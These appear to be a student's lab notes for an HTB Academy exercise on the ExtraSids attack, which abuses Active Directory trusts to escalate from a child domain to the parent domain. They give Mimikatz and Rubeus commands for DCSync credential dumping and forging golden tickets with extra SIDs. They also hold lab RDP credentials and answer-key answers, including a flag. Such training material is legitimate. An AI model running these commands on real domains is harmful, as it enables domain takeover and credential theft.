>[!info] 
>sidHistory stores the SID of a user when one user in a domain migrates to another domain. A new account is created in the second domain. The original user's SID will be stored to the new users SID history attribute

>[!hint] MImikatz SID Attack
> Mimikatz can be used to perform a SID history injection, adding an administrators account to the sidHistory attribute. All SIDS associated with the account are then added to the user's token

>[!warning] 
> The following examples proceeds under the assumption the child domain has been compromised

## ExtraSids Attack via Mimikatz

>[!info]
>Allows for the compromise of a parent domain once the child domain has been comporised.

Pre-requisites for this Attack:
>[!info]
>- The KRBTGT hash for the child domain
>- The SID for the child domain
>- The name of a target user in the child domain (does not need to exist!)
>- The FQDN of the child domain.
>- The SID of the Enterprise Admins group of the root domain.
>- With this data collected, the attack can be performed with Mimikatz.



##### Obtaining the KRBTGT Account's NT Hash using Mimikatz
```go
mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
```

##### Using Get-DomainSID via PowerView
```go
Get-DomainSID
```

##### Obtaining Enterprise Admins Group's SID using Get-DomainGroup
```go
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
```

The above can be done with the Get-ADGroup cmdlet
>[!example]
>```
>Get-ADGroup -Identity "Enterprise Admins" -Server "INLANEFREIGHT.LOCAL"
>```

The following data points have been gathered:

- The KRBTGT hash for the child domain: `9d765b482771505cbe97411065964d5f`
- The SID for the child domain: `S-1-5-21-2806153819-209893948-922872689`
- The name of a target user in the child domain (does not need to exist to create our Golden Ticket!): We'll choose a fake user: `hacker`
- The FQDN of the child domain: `LOGISTICS.INLANEFREIGHT.LOCAL`
- The SID of the Enterprise Admins group of the root domain: `S-1-5-21-3842939050-3880317879-2865463114-519`

Now create a Golden Ticket to access all resources within the parent domain

##### Creating a Golden Ticket with Mimikatz
```go
mimikatz.exe
```

```go
kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
```

##### Confirming a Kerberos Ticket is in Memory Using klist
```go
klist
```

##### Listing the Entire C: Drive of the Domain Controller
```go
ls \\academy-ea-dc01.inlanefreight.local\c$
```



---------------

## ExtraSids Attack - Rubeus

>[!info] This attack can also be performed via Rubeus
#### Using ls to Confirm No Access Before Running Rubeus
```go
ls \\academy-ea-dc01.inlanefreight.local\c$
```

>[!hint]
> Form your Rubeus command using the information gathered

##### Creating a Golden Ticket using Rubeus
```go
.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
```

##### Confirming the Ticket is in Memory Using klist
```go
klist
```

Test new access by performing a DCSync against the parent domain, targeting the `lab_adm` Domain Admin user

#### Performing a DCSync Attack
```go
.\mimikatz.exe
```

```go
lsadump::dcsync /user:INLANEFREIGHT\lab_adm
```

>[!hint]
> When dealing with multiple domains and our target domain is not the same as the user's domain, we will need to specify the exact domain to perform the DCSync operation on the particular domain controller. The command for this would look like the following:
```go
lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
```


------------------------------------------

# Questions

RDP
```go
xfreerdp /v:10.129.180.47 /u:htb-student_adm /p:'HTB_@cademy_stdnt_admin!' /drive:HTB,/home/dan/Desktop/HTB/13-Active-Directory-Enumeration-And-Attacks/domain_trusts /smart-sizing:2400x1200 /cert:ignore
```

### Question 1: What is the SID of the child domain?

Answer:
```go
S-1-5-21-2806153819-209893948-922872689
```


```go
Get-DomainSID
```


### Question 2: What is the SID of the Enterprise Admins group in the root domain?

Answer:
```go
S-1-5-21-3842939050-3880317879-2865463114-519
```

```go
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
```



### Question 3: Perform the ExtraSids attack to compromise the parent domain. Submit the contents of the flag.txt file located in the c:\ExtraSids folder on the ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL domain controller in the parent domain.

Answer:
```go
f@ll1ng_l1k3_d0m1no3$
```

This attack will require the following items:

The KRBTGT hash for the child domain: 
```go
9d765b482771505cbe97411065964d5f
```

The SID for the child domain: 
```go
S-1-5-21-2806153819-209893948-922872689
```

The name of a target user in the child domain (does not need to exist to create our Golden Ticket!): We'll choose a fake user:
```go
test
```

 The FQDN of the child domain:
 ```go
  LOGISTICS.INLANEFREIGHT.LOCAL
 ```

The SID of the Enterprise Admins group of the root domain: 
```go
S-1-5-21-3842939050-3880317879-2865463114-519
```

```go
kerberos::golden /user:test /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
```

In a separate window, execute klist to ensure we have permissions within the parent domain
```go
klist
```

![[Pasted image 20260508072407.png]]

```go
ls \\academy-ea-dc01.inlanefreight.local\c$
```